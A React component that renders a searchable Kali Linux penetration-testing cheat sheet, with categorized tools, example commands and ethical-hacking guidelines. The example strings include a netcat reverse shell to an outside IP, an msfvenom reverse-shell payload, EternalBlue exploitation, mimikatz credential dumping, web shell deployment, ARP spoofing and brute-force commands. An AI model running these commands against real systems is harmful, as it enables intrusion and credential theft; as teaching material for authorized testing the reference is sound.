import { useState } from 'react';
import { Search, Terminal, Shield, Network, Lock, Eye, ChevronDown, ChevronRight, Target, Wifi, Database } from 'lucide-react';

export default function KaliLinuxReference() {
  const [searchQuery, setSearchQuery] = useState("");
  const [expandedSections, setExpandedSections] = useState(new Set());

  const toggleSection = (sectionId) => {
    setExpandedSections(prev => {
      const newSet = new Set(prev);
      if (newSet.has(sectionId)) {
        newSet.delete(sectionId);
      } else {
        newSet.add(sectionId);
      }
      return newSet;
    });
  };

  const referenceData = [
    {
      id: 'recon',
      title: 'Reconnaissance & Information Gathering',
      icon: Eye,
      color: 'from-blue-500 to-blue-600',
      items: [
        {
          name: 'nmap',
          syntax: 'nmap [options] target',
          description: 'Network exploration and security auditing tool',
          example: 'nmap -sV -p- 192.168.1.1\nnmap -sS -O 10.0.0.0/24\nnmap -A -T4 example.com',
          use: '-sV: version detection, -sS: stealth scan, -A: aggressive scan, -p-: all ports'
        },
        {
          name: 'whois',
          syntax: 'whois domain.com',
          description: 'Query domain registration information',
          example: 'whois example.com\nwhois 8.8.8.8',
          use: 'Gather domain ownership, registration dates, nameservers'
        },
        {
          name: 'dig',
          syntax: 'dig [options] domain',
          description: 'DNS lookup utility',
          example: 'dig example.com\ndig example.com ANY\ndig @8.8.8.8 example.com',
          use: 'Query DNS records, troubleshoot DNS issues, find mail servers'
        },
        {
          name: 'theHarvester',
          syntax: 'theHarvester -d domain -b source',
          description: 'OSINT tool for gathering emails, subdomains, IPs',
          example: 'theHarvester -d example.com -b google\ntheHarvester -d target.com -b all',
          use: 'Collect information from public sources, enumerate subdomains'
        },
        {
          name: 'recon-ng',
          syntax: 'recon-ng',
          description: 'Full-featured reconnaissance framework',
          example: 'recon-ng\n> workspaces create company\n> modules search',
          use: 'Automated OSINT gathering, modular framework for recon'
        },
        {
          name: 'maltego',
          syntax: 'maltego',
          description: 'Interactive data mining tool for link analysis',
          example: 'maltego (GUI application)',
          use: 'Visual relationship mapping, OSINT investigations'
        }
      ]
    },
    {
      id: 'scanning',
      title: 'Vulnerability Scanning',
      icon: Target,
      color: 'from-red-500 to-red-600',
      items: [
        {
          name: 'nikto',
          syntax: 'nikto -h target',
          description: 'Web server vulnerability scanner',
          example: 'nikto -h http://example.com\nnikto -h 192.168.1.1 -p 80,443',
          use: 'Scan web servers for known vulnerabilities, misconfigurations'
        },
        {
          name: 'OpenVAS',
          syntax: 'openvas-start',
          description: 'Comprehensive vulnerability assessment scanner',
          example: 'openvas-start\n# Access GUI at https://localhost:9392',
          use: 'Enterprise-grade vulnerability scanning, compliance checks'
        },
        {
          name: 'wpscan',
          syntax: 'wpscan --url target',
          description: 'WordPress security scanner',
          example: 'wpscan --url http://example.com\nwpscan --url http://site.com --enumerate u,p',
          use: 'Find WordPress vulnerabilities, enumerate users and plugins'
        },
        {
          name: 'nuclei',
          syntax: 'nuclei -u target',
          description: 'Fast vulnerability scanner based on templates',
          example: 'nuclei -u https://example.com\nnuclei -l urls.txt -t cves/',
          use: 'Template-based scanning, CVE detection, modern scanning'
        },
        {
          name: 'sqlmap',
          syntax: 'sqlmap -u url',
          description: 'Automatic SQL injection and database takeover tool',
          example: 'sqlmap -u "http://site.com/page?id=1"\nsqlmap -u url --dbs --batch',
          use: 'Detect and exploit SQL injection vulnerabilities'
        }
      ]
    },
    {
      id: 'exploitation',
      title: 'Exploitation Tools',
      icon: Shield,
      color: 'from-purple-500 to-purple-600',
      items: [
        {
          name: 'metasploit',
          syntax: 'msfconsole',
          description: 'Penetration testing framework',
          example: 'msfconsole\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue\nmsf6 > set RHOSTS 192.168.1.100',
          use: 'Exploit development, payload delivery, post-exploitation'
        },
        {
          name: 'searchsploit',
          syntax: 'searchsploit keyword',
          description: 'Search Exploit-DB archive',
          example: 'searchsploit apache 2.4\nsearchsploit -m 12345',
          use: 'Find public exploits, copy exploit code locally'
        },
        {
          name: 'msfvenom',
          syntax: 'msfvenom -p payload options',
          description: 'Payload generator and encoder',
          example: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > shell.exe',
          use: 'Create custom payloads for various platforms'
        },
        {
          name: 'BeEF',
          syntax: 'beef-xss',
          description: 'Browser exploitation framework',
          example: 'beef-xss\n# Access at http://127.0.0.1:3000/ui/panel',
          use: 'Client-side attacks, browser hooking, XSS exploitation'
        },
        {
          name: 'SET',
          syntax: 'setoolkit',
          description: 'Social Engineering Toolkit',
          example: 'setoolkit\n# Menu-driven interface',
          use: 'Phishing campaigns, credential harvesting, payload delivery'
        }
      ]
    },
    {
      id: 'wireless',
      title: 'Wireless Attacks',
      icon: Wifi,
      color: 'from-green-500 to-green-600',
      items: [
        {
          name: 'aircrack-ng',
          syntax: 'aircrack-ng [options] capture.cap',
          description: 'WiFi security auditing suite',
          example: 'airmon-ng start wlan0\nairodump-ng wlan0mon\naircrack-ng -w wordlist.txt capture.cap',
          use: 'Crack WEP/WPA/WPA2 keys, monitor wireless networks'
        },
        {
          name: 'airodump-ng',
          syntax: 'airodump-ng interface',
          description: 'Wireless packet capture',
          example: 'airodump-ng wlan0mon\nairodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon',
          use: 'Capture WPA handshakes, monitor access points'
        },
        {
          name: 'aireplay-ng',
          syntax: 'aireplay-ng [attack] [options]',
          description: 'Packet injection tool',
          example: 'aireplay-ng --deauth 10 -a BSSID wlan0mon\naireplay-ng -9 wlan0mon',
          use: 'Deauthentication attacks, packet injection'
        },
        {
          name: 'wifite',
          syntax: 'wifite',
          description: 'Automated wireless attack tool',
          example: 'wifite\nwifite --kill',
          use: 'Automated WiFi cracking, user-friendly interface'
        },
        {
          name: 'reaver',
          syntax: 'reaver -i interface -b BSSID',
          description: 'WPS PIN brute-force attack',
          example: 'reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv',
          use: 'Exploit WPS vulnerabilities, recover WPA/WPA2 passphrases'
        },
        {
          name: 'Fern WiFi Cracker',
          syntax: 'fern-wifi-cracker',
          description: 'GUI-based wireless security auditing',
          example: 'fern-wifi-cracker (GUI application)',
          use: 'User-friendly WiFi pentesting, WEP/WPA/WPS attacks'
        }
      ]
    },
    {
      id: 'password',
      title: 'Password Attacks',
      icon: Lock,
      color: 'from-yellow-500 to-yellow-600',
      items: [
        {
          name: 'john',
          syntax: 'john [options] hashfile',
          description: 'John the Ripper password cracker',
          example: 'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\njohn --show hashes.txt',
          use: 'Crack password hashes, supports many hash formats'
        },
        {
          name: 'hashcat',
          syntax: 'hashcat -m mode -a attack hash wordlist',
          description: 'Advanced password recovery tool',
          example: 'hashcat -m 1000 -a 0 hashes.txt rockyou.txt\nhashcat -m 2500 capture.hccapx wordlist.txt',
          use: 'GPU-accelerated cracking, fastest password cracker'
        },
        {
          name: 'hydra',
          syntax: 'hydra [options] target protocol',
          description: 'Network logon cracker',
          example: 'hydra -l admin -P passwords.txt ssh://192.168.1.1\nhydra -L users.txt -P pass.txt ftp://target.com',
          use: 'Brute-force network services (SSH, FTP, HTTP, etc.)'
        },
        {
          name: 'medusa',
          syntax: 'medusa [options]',
          description: 'Parallel network login brute-forcer',
          example: 'medusa -h 192.168.1.1 -u admin -P passwords.txt -M ssh\nmedusa -H hosts.txt -U users.txt -P pass.txt -M ftp',
          use: 'Multi-threaded brute-forcing, supports many protocols'
        },
        {
          name: 'crunch',
          syntax: 'crunch min max [options]',
          description: 'Wordlist generator',
          example: 'crunch 8 8 -t @@@@%%%% -o wordlist.txt\ncrunch 4 6 0123456789 -o numbers.txt',
          use: 'Create custom wordlists, pattern-based generation'
        },
        {
          name: 'cewl',
          syntax: 'cewl url [options]',
          description: 'Custom wordlist generator from websites',
          example: 'cewl http://example.com -w wordlist.txt\ncewl -d 2 -m 5 http://target.com',
          use: 'Generate wordlists from target websites'
        }
      ]
    },
    {
      id: 'web',
      title: 'Web Application Testing',
      icon: Network,
      color: 'from-teal-500 to-teal-600',
      items: [
        {
          name: 'burpsuite',
          syntax: 'burpsuite',
          description: 'Web application security testing platform',
          example: 'burpsuite (GUI application)\n# Configure browser proxy to 127.0.0.1:8080',
          use: 'Intercept HTTP traffic, scan for vulnerabilities, manual testing'
        },
        {
          name: 'zaproxy',
          syntax: 'zaproxy',
          description: 'OWASP Zed Attack Proxy',
          example: 'zaproxy (GUI application)\n# Or: zap.sh -daemon -port 8080',
          use: 'Automated web app scanning, passive/active testing'
        },
        {
          name: 'dirb',
          syntax: 'dirb url [wordlist]',
          description: 'Web content scanner',
          example: 'dirb http://example.com\ndirb http://target.com /usr/share/wordlists/dirb/common.txt',
          use: 'Discover hidden directories and files on web servers'
        },
        {
          name: 'gobuster',
          syntax: 'gobuster dir -u url -w wordlist',
          description: 'Fast directory/file brute-forcing',
          example: 'gobuster dir -u http://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt',
          use: 'Faster alternative to dirb, supports DNS and vhost enumeration'
        },
        {
          name: 'ffuf',
          syntax: 'ffuf -u url -w wordlist',
          description: 'Fast web fuzzer',
          example: 'ffuf -u http://example.com/FUZZ -w wordlist.txt\nffuf -u http://FUZZ.example.com -w subdomains.txt',
          use: 'Modern fuzzing tool, parameter discovery, subdomain enumeration'
        },
        {
          name: 'commix',
          syntax: 'commix --url url',
          description: 'Command injection exploitation tool',
          example: 'commix --url="http://example.com/page?cmd=INJECT_HERE"',
          use: 'Detect and exploit command injection vulnerabilities'
        }
      ]
    },
    {
      id: 'sniffing',
      title: 'Network Sniffing & Spoofing',
      icon: Database,
      color: 'from-pink-500 to-pink-600',
      items: [
        {
          name: 'wireshark',
          syntax: 'wireshark',
          description: 'Network protocol analyzer',
          example: 'wireshark (GUI application)\n# Or: tshark -i eth0 -w capture.pcap',
          use: 'Capture and analyze network traffic, protocol analysis'
        },
        {
          name: 'tcpdump',
          syntax: 'tcpdump [options]',
          description: 'Command-line packet analyzer',
          example: 'tcpdump -i eth0 -w capture.pcap\ntcpdump -r capture.pcap port 80',
          use: 'Lightweight packet capture, filter and analyze traffic'
        },
        {
          name: 'ettercap',
          syntax: 'ettercap [options]',
          description: 'Network sniffer/interceptor for MITM attacks',
          example: 'ettercap -T -M arp:remote /192.168.1.1/ /192.168.1.100/\nettercap -G',
          use: 'ARP poisoning, MITM attacks, password sniffing'
        },
        {
          name: 'arpspoof',
          syntax: 'arpspoof -i interface -t target gateway',
          description: 'ARP spoofing tool',
          example: 'arpspoof -i eth0 -t 192.168.1.100 192.168.1.1',
          use: 'Simple ARP spoofing for MITM attacks'
        },
        {
          name: 'responder',
          syntax: 'responder -I interface',
          description: 'LLMNR, NBT-NS and MDNS poisoner',
          example: 'responder -I eth0 -wrf\nresponder -I wlan0 -v',
          use: 'Capture NTLM hashes, credential theft on local networks'
        },
        {
          name: 'bettercap',
          syntax: 'bettercap',
          description: 'Modern network attack and monitoring framework',
          example: 'bettercap -iface eth0\n> net.probe on\n> net.sniff on',
          use: 'MITM attacks, network monitoring, WiFi attacks'
        }
      ]
    },
    {
      id: 'postexploit',
      title: 'Post-Exploitation & Persistence',
      icon: Terminal,
      color: 'from-indigo-500 to-indigo-600',
      items: [
        {
          name: 'netcat',
          syntax: 'nc [options] host port',
          description: 'Swiss army knife of networking',
          example: 'nc -lvp 4444  # Listen\nnc 192.168.1.100 4444  # Connect\nnc -e /bin/bash 10.0.0.1 4444  # Reverse shell',
          use: 'Create reverse/bind shells, transfer files, port scanning'
        },
        {
          name: 'mimikatz',
          syntax: 'mimikatz.exe',
          description: 'Windows credential extraction tool',
          example: 'mimikatz # sekurlsa::logonpasswords\nmimikatz # lsadump::sam',
          use: 'Extract Windows passwords, hashes, Kerberos tickets'
        },
        {
          name: 'empire',
          syntax: 'powershell-empire',
          description: 'Post-exploitation framework',
          example: 'powershell-empire server\n# Access client interface',
          use: 'PowerShell-based post-exploitation, persistence, lateral movement'
        },
        {
          name: 'weevely',
          syntax: 'weevely generate password path',
          description: 'Web shell and post-exploitation tool',
          example: 'weevely generate mypass /var/www/shell.php\nweevely http://target.com/shell.php mypass',
          use: 'PHP web shell with over 30 modules for post-exploitation'
        },
        {
          name: 'proxychains',
          syntax: 'proxychains command',
          description: 'Force connections through proxy',
          example: 'proxychains nmap -sT 10.0.0.1\nproxychains firefox',
          use: 'Route traffic through SOCKS/HTTP proxies, anonymity'
        },
        {
          name: 'socat',
          syntax: 'socat [options] address1 address2',
          description: 'Advanced netcat alternative',
          example: 'socat TCP-L:4444 EXEC:/bin/bash\nsocat - TCP:192.168.1.1:4444',
          use: 'Encrypted shells, port forwarding, advanced networking'
        }
      ]
    }
  ];

  const filteredData = referenceData.map(section => ({
    ...section,
    items: section.items.filter(item =>
      item.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
      item.description.toLowerCase().includes(searchQuery.toLowerCase()) ||
      item.syntax.toLowerCase().includes(searchQuery.toLowerCase())
    )
  })).filter(section => section.items.length > 0);

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 to-gray-800">
      {/* Hero Section */}
      <section className="bg-gradient-to-r from-red-600 via-red-700 to-red-800 text-white">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-16 md:py-20">
          <div className="text-center mb-8">
            <div className="inline-flex items-center justify-center w-20 h-20 bg-white/20 rounded-3xl mb-6 backdrop-blur-sm">
              <Shield size={40} />
            </div>
            <h1 className="text-4xl md:text-5xl font-bold mb-4">
              Kali Linux Reference
            </h1>
            <p className="text-xl text-red-100 max-w-2xl mx-auto mb-6">
              Complete guide to penetration testing tools, commands, and security auditing techniques
            </p>
          </div>

          {/* Search Bar */}
          <div className="max-w-2xl mx-auto">
            <div className="relative">
              <input
                type="text"
                placeholder="Search security tools and commands..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="w-full pl-14 pr-4 py-4 rounded-2xl text-gray-900 text-lg focus:outline-none focus:ring-4 focus:ring-red-300 shadow-2xl"
              />
              <Search className="absolute left-5 top-1/2 transform -translate-y-1/2 text-gray-400" size={24} />
            </div>
          </div>
        </div>
      </section>

      {/* Reference Sections */}
      <section className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
        <div className="space-y-6">
          {filteredData.map((section) => {
            const Icon = section.icon;
            const isExpanded = expandedSections.has(section.id);
            
            return (
              <div key={section.id} className="bg-gray-800 rounded-2xl shadow-xl overflow-hidden border border-gray-700">
                {/* Section Header */}
                <button
                  onClick={() => toggleSection(section.id)}
                  className="w-full p-6 flex items-center justify-between hover:bg-gray-750 transition-colors"
                >
                  <div className="flex items-center gap-4">
                    <div className={`w-12 h-12 bg-gradient-to-br ${section.color} rounded-xl flex items-center justify-center`}>
                      <Icon className="text-white" size={24} />
                    </div>
                    <div className="text-left">
                      <h2 className="text-2xl font-bold text-white">{section.title}</h2>
                      <p className="text-sm text-gray-400 mt-1">{section.items.length} tools</p>
                    </div>
                  </div>
                  {isExpanded ? (
                    <ChevronDown className="text-gray-400" size={24} />
                  ) : (
                    <ChevronRight className="text-gray-400" size={24} />
                  )}
                </button>

                {/* Section Content */}
                {isExpanded && (
                  <div className="border-t border-gray-700">
                    <div className="p-6 space-y-6">
                      {section.items.map((item, index) => (
                        <div key={index} className="border-l-4 border-gray-700 pl-6 hover:border-red-500 transition-colors">
                          <h3 className="text-xl font-bold text-white mb-2">{item.name}</h3>
                          <p className="text-gray-300 mb-3">{item.description}</p>
                          
                          <div className="bg-gray-900 rounded-lg p-4 mb-3 font-mono text-sm border border-gray-700">
                            <p className="text-xs font-semibold text-gray-400 uppercase mb-2">Syntax</p>
                            <code className="text-purple-400">{item.syntax}</code>
                          </div>
                          
                          <div className="bg-black rounded-lg p-4 mb-3 border border-gray-700">
                            <p className="text-xs font-semibold text-gray-400 uppercase mb-2">Example</p>
                            <pre className="text-sm font-mono text-green-400 overflow-x-auto">
                              <code>{item.example}</code>
                            </pre>
                          </div>

                          <div className="bg-red-950/50 rounded-lg p-3 border border-red-900/50">
                            <p className="text-xs font-semibold text-red-400 uppercase mb-1">Usage</p>
                            <p className="text-sm text-red-200">{item.use}</p>
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </div>
            );
          })}
        </div>

        {filteredData.length === 0 && (
          <div className="text-center py-16">
            <Search className="mx-auto text-gray-600 mb-4" size={64} />
            <h3 className="text-2xl font-semibold text-gray-300 mb-2">
              No results found
            </h3>
            <p className="text-gray-500 mb-6">
              Try a different search term
            </p>
            <button
              onClick={() => setSearchQuery("")}
              className="px-6 py-3 bg-red-600 text-white rounded-lg font-medium hover:bg-red-700 transition-colors"
            >
              Clear Search
            </button>
          </div>
        )}
      </section>

      {/* Best Practices Section */}
      <section className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
        <div className="bg-gradient-to-br from-red-900/30 to-red-800/30 rounded-3xl p-8 md:p-12 border border-red-900/50">
          <h2 className="text-3xl font-bold text-center text-white mb-8">
            Ethical Hacking Guidelines
          </h2>
          <div className="grid md:grid-cols-3 gap-6">
            <div className="bg-gray-800 rounded-xl p-6 shadow-xl border border-gray-700">
              <Shield className="text-red-500 mb-4" size={32} />
              <h3 className="text-xl font-bold text-white mb-2">Authorization</h3>
              <p className="text-gray-300 text-sm">
                Always obtain written permission before testing. Unauthorized access is illegal.
              </p>
            </div>
            <div className="bg-gray-800 rounded-xl p-6 shadow-xl border border-gray-700">
              <Lock className="text-red-500 mb-4" size={32} />
              <h3 className="text-xl font-bold text-white mb-2">Responsible Disclosure</h3>
              <p className="text-gray-300 text-sm">
                Report vulnerabilities to vendors privately. Give them time to patch before public disclosure.
              </p>
            </div>
            <div className="bg-gray-800 rounded-xl p-6 shadow-xl border border-gray-700">
              <Terminal className="text-red-500 mb-4" size={32} />
              <h3 className="text-xl font-bold text-white mb-2">Document Everything</h3>
              <p className="text-gray-300 text-sm">
                Keep detailed logs of all testing activities. Screenshots and command history are essential.
              </p>
            </div>
          </div>
          <div className="mt-8 bg-yellow-900/20 border border-yellow-700 rounded-lg p-4">
            <p className="text-yellow-200 text-center font-semibold">
              ⚠️ WARNING: These tools are for authorized security testing only. Misuse may violate laws.
            </p>
          </div>
        </div>
      </section>
    </div>
  );
}